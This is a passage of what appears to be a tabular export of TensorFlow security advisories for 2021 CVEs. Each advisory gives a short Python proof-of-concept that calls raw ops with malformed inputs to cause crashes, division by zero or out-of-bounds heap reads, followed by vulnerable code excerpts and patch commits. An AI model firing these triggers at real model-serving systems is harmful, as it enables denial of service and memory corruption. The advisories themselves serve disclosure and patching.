Most implementations of convolution operators in TensorFlow are affected by a division by 0 vulnerability where an attacker can trigger a denial of service via a crash:

```python
import tensorflow as tf

tf.compat.v1.disable_v2_behavior()
tf.raw_ops.Conv2D(
  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  strides = [1, 1, 1, 1],
  padding = ""SAME"")
```

The shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/framework/common_shape_fns.cc#L577) is missing several validations before doing divisions and modulo operations.

### Patches
We have patched the issue in GitHub commit [8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4](https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security.",pip
1701,20741,tensorflow,GHSA-7ghq-fvr3-pj2x,CVE-2021-37674,https://github.com/advisories/GHSA-7ghq-fvr3-pj2x,moderate,2021-08-25 14:41:33 UTC,Incomplete validation in `MaxPoolGrad`,"### Impact
An attacker can trigger a denial of service via a segmentation fault in `tf.raw_ops.MaxPoolGrad` caused by missing validation:

```python
import tensorflow as tf
  
tf.raw_ops.MaxPoolGrad(
  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
  ksize = [1, 16, 16, 1],
  strides = [1, 16, 18, 1],
  padding = ""EXPLICIT"",
  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/maxpooling_op.cc) misses some validation for the `orig_input` and `orig_output` tensors.

The fixes for [CVE-2021-29579](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-068.md) were incomplete.
                                                                                                                                                                                                                                                                                          
### Patches
We have patched the issue in GitHub commit [136b51f10903e044308cf77117c0ed9871350475](https://github.com/tensorflow/tensorflow/commit/136b51f10903e044308cf77117c0ed9871350475).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security.",pip
1702,20741,tensorflow,GHSA-278g-rq84-9hmg,CVE-2021-37673,https://github.com/advisories/GHSA-278g-rq84-9hmg,moderate,2021-08-25 14:41:36 UTC,`CHECK`-fail in `MapStage`,"### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.MapStage`:

```python
import tensorflow as tf
  
tf.raw_ops.MapStage(
  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),
  indices=tf.constant((0), dtype=tf.int32),
  values=[tf.constant((0), dtype=tf.int32)],
  dtypes=[tf.int32,
  tf.int64],
  capacity=0,
  memory_limit=0,
  container='',
  shared_name='')
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L513) does not check that the `key` input is a valid non-empty tensor.
  
### Patches
We have patched the issue in GitHub commit [d7de67733925de196ec8863a33445b73f9562d1d](https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
1703,20741,tensorflow,GHSA-5hj3-vjjf-f5m7,CVE-2021-37672,https://github.com/advisories/GHSA-5hj3-vjjf-f5m7,moderate,2021-08-25 14:41:39 UTC,Heap OOB in `SdcaOptimizerV2`,"### Impact
An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`:

```python
import tensorflow as tf
  
tf.raw_ops.SdcaOptimizerV2(
  sparse_example_indices=[[1]],
  sparse_feature_indices=[[1]],
  sparse_feature_values=[[1.0,2.0]],
  dense_features=[[1.0]],
  example_weights=[1.0],
  example_labels=[],
  sparse_indices=[1],
  sparse_weights=[1.0],
  dense_weights=[[1.0]],
  example_state_data=[[100.0,100.0,100.0,100.0]],
  loss_type='logistic_loss',
  l1=100.0,
  l2=100.0,
  num_loss_partitions=1,
  num_inner_iterations=1,
  adaptive=True)       
``` 

The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/sdca_internal.cc#L320-L353) does not check that the length of `example_labels` is the same as the number of examples.

### Patches
We have patched the issue in GitHub commit [a4e138660270e7599793fa438cd7b2fc2ce215a6](https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1704,20741,tensorflow,GHSA-qr82-2c78-4m8h,CVE-2021-37671,https://github.com/advisories/GHSA-qr82-2c78-4m8h,high,2021-08-25 14:41:42 UTC,Reference binding to nullptr in map operations,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.Map*` and `tf.raw_ops.OrderedMap*` operations:

```python
import tensorflow as tf
  
tf.raw_ops.MapPeek(
  key=tf.constant([8],dtype=tf.int64),
  indices=[],
  dtypes=[tf.int32],
  capacity=8,
  memory_limit=128)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L222-L248) has a check in place to ensure that `indices` is in ascending order, but does not check that `indices` is not empty.
    
### Patches
We have patched the issue in GitHub commit [532f5c5a547126c634fefd43bbad1dc6417678ac](https://github.com/tensorflow/tensorflow/commit/532f5c5a547126c634fefd43bbad1dc6417678ac).
                       
The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
    
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1705,20741,tensorflow,GHSA-9697-98pf-4rw7,CVE-2021-37670,https://github.com/advisories/GHSA-9697-98pf-4rw7,moderate,2021-08-25 14:41:44 UTC,Heap OOB in `UpperBound` and `LowerBound`,"### Impact
An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.UpperBound`:

```python
import tensorflow as tf
  
tf.raw_ops.UpperBound(
  sorted_input=[1,2,3],
  values=tf.constant(value=[[0,0,0],[1,1,1],[2,2,2]],dtype=tf.int64),
  out_type=tf.int64)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/searchsorted_op.cc#L85-L104) does not validate the rank of `sorted_input` argument:

```cc
  void Compute(OpKernelContext* ctx) override {
    const Tensor& sorted_inputs_t = ctx->input(0);
    // ...
    OP_REQUIRES(ctx, sorted_inputs_t.dim_size(0) == values_t.dim_size(0),
                Status(error::INVALID_ARGUMENT,
                       ""Leading dim_size of both tensors must match.""));
    // ...
    if (output_t->dtype() == DT_INT32) {
      OP_REQUIRES(ctx,
                  FastBoundsCheck(sorted_inputs_t.dim_size(1), ...));
      // ...
    }
```

As we access the first two dimensions of `sorted_inputs_t` tensor, it must have rank at least 2.

A similar issue occurs in `tf.raw_ops.LowerBound`.

### Patches
We have patched the issue in GitHub commit [42459e4273c2e47a3232cc16c4f4fff3b3a35c38](https://github.com/tensorflow/tensorflow/commit/42459e4273c2e47a3232cc16c4f4fff3b3a35c38).
  
The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1706,20741,tensorflow,GHSA-vmjw-c2vp-p33c,CVE-2021-37669,https://github.com/advisories/GHSA-vmjw-c2vp-p33c,moderate,2021-08-25 14:42:03 UTC,Crash in NMS ops caused by integer conversion to unsigned,"### Impact
An attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:

```python
import tensorflow as tf

tf.raw_ops.NonMaxSuppressionV5(
  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],
  scores=[1.0,2.0,3.0],
  max_output_size=-1,
  iou_threshold=0.5,
  score_threshold=0.5,
  soft_nms_sigma=1.0,
  pad_to_max_output_size=True)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:

```cc
  const int output_size = max_output_size.scalar<int>()();
  // ...
  std::vector<int> selected;
  // ...
  if (pad_to_max_output_size) {
    selected.resize(output_size, 0);
    // ...
  }
```
    
However, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.

A similar issue occurs in `CombinedNonMaxSuppression`:

```python
import tensorflow as tf

tf.raw_ops.NonMaxSuppressionV5(
  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],
  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],
  max_output_size_per_class=-1,
  max_total_size=10,
  iou_threshold=score_threshold=0.5,
  pad_per_class=True,
  clip_boxes=True)
```
  
### Patches
We have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1707,20741,tensorflow,GHSA-2wmv-37vq-52g5,CVE-2021-37668,https://github.com/advisories/GHSA-2wmv-37vq-52g5,moderate,2021-08-25 14:42:06 UTC,FPE in `tf.raw_ops.UnravelIndex`,"### Impact
An attacker can cause denial of service in applications serving models using `tf.raw_ops.UnravelIndex` by triggering a division by 0:

```python
import tensorflow as tf

tf.raw_ops.UnravelIndex(indices=-1, dims=[1,0,2])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/unravel_index_op.cc#L36) does not check that the tensor subsumed by `dims` is not empty. Hence, if one element of `dims` is 0, the implementation does a division by 0.

### Patches
We have patched the issue in GitHub commit [a776040a5e7ebf76eeb7eb923bf1ae417dd4d233](https://github.com/tensorflow/tensorflow/commit/a776040a5e7ebf76eeb7eb923bf1ae417dd4d233).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1708,20741,tensorflow,GHSA-w74j-v8xh-3w5h,CVE-2021-37667,https://github.com/advisories/GHSA-w74j-v8xh-3w5h,high,2021-08-25 14:42:09 UTC,Reference binding to nullptr in unicode encoding,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.UnicodeEncode`:

```python
import tensorflow as tf
from tensorflow.python.ops import gen_string_ops

gen_string_ops.unicode_encode(
  input_values=[],
  input_splits=[],
  output_encoding='UTF-8',
  errors='ignore',
  replacement_char='a')
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/unicode_ops.cc#L533-L539) reads the first dimension of the `input_splits` tensor before validating that this tensor is not empty: 

```cc
  const Tensor& input_splits = context->input(1);
  const auto input_splits_flat = input_splits.flat<SPLITS_TYPE>();
  TensorShape output_shape({input_splits.dim_size(0) - 1});
```

### Patches
We have patched the issue in GitHub commit [2e0ee46f1a47675152d3d865797a18358881d7a6](https://github.com/tensorflow/tensorflow/commit/2e0ee46f1a47675152d3d865797a18358881d7a6).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1709,20741,tensorflow,GHSA-w4xf-2pqw-5mq7,CVE-2021-37666,https://github.com/advisories/GHSA-w4xf-2pqw-5mq7,high,2021-08-25 14:42:13 UTC,Reference binding to nullptr in `RaggedTensorToVariant`,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToVariant`:

```python
import tensorflow as tf

tf.raw_ops.RaggedTensorToVariant(
  rt_nested_splits=[],
  rt_dense_values=[1,2,3],
  batched_input=True)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/ragged_tensor_to_variant_op.cc#L129) has an incomplete validation of the splits values, missing the case when the argument would be empty.

### Patches
We have patched the issue in GitHub commit [be7a4de6adfbd303ce08be4332554dff70362612](https://github.com/tensorflow/tensorflow/commit/be7a4de6adfbd303ce08be4332554dff70362612).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1710,20741,tensorflow,GHSA-v82p-hv3v-p6qp,CVE-2021-37665,https://github.com/advisories/GHSA-v82p-hv3v-p6qp,high,2021-08-25 14:42:16 UTC,Incomplete validation in MKL requantization,"### Impact
Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:

```python
import tensorflow as tf

tf.raw_ops.RequantizationRangePerChannel(
  input=[],
  input_min=[0,0,0,0,0],
  input_max=[1,1,1,1,1],
  clip_value_max=1)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/mkl/mkl_requantization_range_per_channel_op.cc) does not validate the dimensions of the `input` tensor.

A similar issue occurs in `MklRequantizePerChannelOp`:

```python
import tensorflow as tf 
from tensorflow.python.ops import gen_math_ops

gen_math_ops.requantize_per_channel(
  input=[],
  input_min=[-100,-100,-100,-100,-100],
  input_max=[-100,-100,-100],
  requested_output_min=[-100,-100,-100,-100,-100],
  requested_output_max=[],
  out_type=tf.int)
``` 

The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/mkl/mkl_requantize_per_channel_op.cc) does not perform full validation for all the input arguments.

### Patches
We have patched the issue in GitHub commit [9e62869465573cb2d9b5053f1fa02a81fce21d69](https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69) and in the Github commit [203214568f5bc237603dbab6e1fd389f1572f5c9](https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1711,20741,tensorflow,GHSA-r4c4-5fpq-56wg,CVE-2021-37664,https://github.com/advisories/GHSA-r4c4-5fpq-56wg,high,2021-08-25 14:42:20 UTC,Heap OOB in boosted trees,"### Impact
An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `BoostedTreesSparseCalculateBestFeatureSplit`:

```python
import tensorflow as tf

tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(
  node_id_range=[0,10],
  stats_summary_indices=[[1, 2, 3, 0x1000000]],
  stats_summary_values=[1.0],
  stats_summary_shape=[1,1,1,1],
  l1=l2=[1.0],
  tree_complexity=[0.5],
  min_node_weight=[1.0],
  logits_dimension=3,
  split_type='inequality')                                                                                                                                                                                                                                                                
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) needs to validate that each value in `stats_summary_indices` is in range.
  
### Patches
We have patched the issue in GitHub commit [e84c975313e8e8e38bb2ea118196369c45c51378](https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378).
  
The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1712,20741,tensorflow,GHSA-g25h-jr74-qp5j,CVE-2021-37663,https://github.com/advisories/GHSA-g25h-jr74-qp5j,high,2021-08-25 14:42:23 UTC,Incomplete validation in `QuantizeV2`,"### Impact                                                                                                                                                                                                                                                                                
Due to incomplete validation in `tf.raw_ops.QuantizeV2`, an attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:

```python
import tensorflow as tf

tf.raw_ops.QuantizeV2(
  input=[1,2,3],
  min_range=[1,2],
  max_range=[],
  T=tf.qint32,
  mode='SCALED',
  round_mode='HALF_AWAY_FROM_ZERO',
  narrow_range=False,
  axis=1,
  ensure_minimum_range=3)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/quantize_op.cc#L59) has some validation but does not check that `min_range` and `max_range` both have the same non-zero number of elements. If `axis` is provided (i.e., not `-1`), then validation should check that it is a value in range for the rank of `input` tensor and then the lengths of `min_range` and `max_range` inputs match the `axis` dimension of the `input` tensor.
  
### Patches
We have patched the issue in GitHub commit [6da6620efad397c85493b8f8667b821403516708](https://github.com/tensorflow/tensorflow/commit/6da6620efad397c85493b8f8667b821403516708).
  
The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1713,20741,tensorflow,GHSA-f5cx-5wr3-5qrc,CVE-2021-37662,https://github.com/advisories/GHSA-f5cx-5wr3-5qrc,high,2021-08-25 14:42:26 UTC,Reference binding to nullptr in boosted trees,"### Impact
An attacker can generate undefined behavior via a reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature`:

```python
import tensorflow as tf

tf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(
  node_id_range=[],
  stats_summary_list=[[1,2,3]],
  l1=[1.0],
  l2=[1.0],
  tree_complexity =[1.0],
  min_node_weight =[1.17],
  max_splits=5)
```

A similar attack can occur in `BoostedTreesCalculateBestFeatureSplitV2`:

```python
import tensorflow as tf
                                                                                                                                                                                                                                                                                          
tf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(
  node_id_range=[],
  stats_summaries_list=[[1,2,3]],
  split_types=[''],
  candidate_feature_ids=[1,2,3,4],
  l1=[1],     
  l2=[1],
  tree_complexity=[1.0],
  min_node_weight=[1.17],
  logits_dimension=5)
```     
    
The  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) does not validate the input values.

### Patches
We have patched the issue in GitHub commit [9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad](https://github.com/tensorflow/tensorflow/commit/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad) and in commit. [429f009d2b2c09028647dd4bb7b3f6f414bbaad7](https://github.com/tensorflow/tensorflow/commit/429f009d2b2c09028647dd4bb7b3f6f414bbaad7).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. 

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1714,20741,tensorflow,GHSA-gf88-j2mg-cc82,CVE-2021-37661,https://github.com/advisories/GHSA-gf88-j2mg-cc82,moderate,2021-08-25 14:42:28 UTC,Crash caused by integer conversion to unsigned,"### Impact
An attacker can cause a denial of service in `boosted_trees_create_quantile_stream_resource` by using negative arguments:

```python
import tensorflow as tf
from tensorflow.python.ops import gen_boosted_trees_ops
import numpy as np

v= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])
gen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(
  quantile_stream_resource_handle = v.handle,
  epsilon = [74.82224],
  num_streams = [-49], 
  max_elements = np.int32(586))
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantile_ops.cc#L96) does not validate that `num_streams` only contains non-negative numbers. In turn, [this results in using this value to allocate memory](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantiles/quantile_stream_resource.h#L31-L40):

```cc
class BoostedTreesQuantileStreamResource : public ResourceBase {
 public:
  BoostedTreesQuantileStreamResource(const float epsilon,
                                     const int64 max_elements,
                                     const int64 num_streams)
      : are_buckets_ready_(false),
        epsilon_(epsilon),
        num_streams_(num_streams),
        max_elements_(max_elements) {
    streams_.reserve(num_streams_);
    ...
  }
}
```

However, `reserve` receives an unsigned integer so there is an implicit conversion from a negative value to a large positive unsigned. This results in a crash from the standard library.

### Patches
We have patched the issue in GitHub commit [8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992](https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1715,20741,tensorflow,GHSA-cm5x-837x-jf3c,CVE-2021-37660,https://github.com/advisories/GHSA-cm5x-837x-jf3c,moderate,2021-08-25 14:42:44 UTC,Division by 0 in inplace operations,"### Impact
An attacker can cause a floating point exception by calling inplace operations with crafted arguments that would result in a division by 0:

```python
import tensorflow as tf

tf.raw_ops.InplaceSub(x=[],i=[-99,-1,-1],v=[1,1,1])
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/inplace_ops.cc#L283) has a logic error: it should skip processing if `x` and `v` are empty but the code uses `||` instead of `&&`.

### Patches
We have patched the issue in GitHub commit [e86605c0a336c088b638da02135ea6f9f6753618](https://github.com/tensorflow/tensorflow/commit/e86605c0a336c088b638da02135ea6f9f6753618).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1716,20741,tensorflow,GHSA-q3g3-h9r4-prrc,CVE-2021-37659,https://github.com/advisories/GHSA-q3g3-h9r4-prrc,high,2021-08-25 14:42:47 UTC,Reference binding to nullptr and heap OOB in binary cwise ops,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in all binary cwise operations that don't require broadcasting (e.g., gradients of binary cwise operations):

```python
import tensorflow as tf

tf.raw_ops.SqrtGrad(y=[4, 16],dy=[])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/cwise_ops_common.h#L264) assumes that the two inputs have exactly the same number of elements but does not check that. Hence, when the eigen functor executes it triggers heap OOB reads and undefined behavior due to binding to nullptr.

### Patches
We have patched the issue in GitHub commit [93f428fd1768df147171ed674fee1fc5ab8309ec](https://github.com/tensorflow/tensorflow/commit/93f428fd1768df147171ed674fee1fc5ab8309ec).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported by members of the Aivul Team from Qihoo  360.",pip
1717,20741,tensorflow,GHSA-6p5r-g9mq-ggh2,CVE-2021-37658,https://github.com/advisories/GHSA-6p5r-g9mq-ggh2,high,2021-08-25 14:42:49 UTC,Reference binding to nullptr in `MatrixSetDiagV*` ops,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixSetDiagV*`:

```python
import tensorflow as tf

tf.raw_ops.MatrixSetDiagV3(
  input=[1,2,3],
  diagonal=[1,1],
  k=[],
  align='RIGHT_LEFT')
```
  
The  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/linalg/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong: 

```cc 
  auto& diag_index = context->input(1);
  ...
  lower_diag_index = diag_index.flat<int32>()(0);
```
  
### Patches
We have patched the issue in GitHub commit [ff8894044dfae5568ecbf2ed514c1a37dc394f1b](https://github.com/tensorflow/tensorflow/commit/ff8894044dfae5568ecbf2ed514c1a37dc394f1b).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1718,20741,tensorflow,GHSA-5xwc-mrhx-5g3m,CVE-2021-37657,https://github.com/advisories/GHSA-5xwc-mrhx-5g3m,high,2021-08-25 14:42:52 UTC,Reference binding to nullptr in `MatrixDiagV*` ops,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixDiagV*`:

```python
import tensorflow as tf

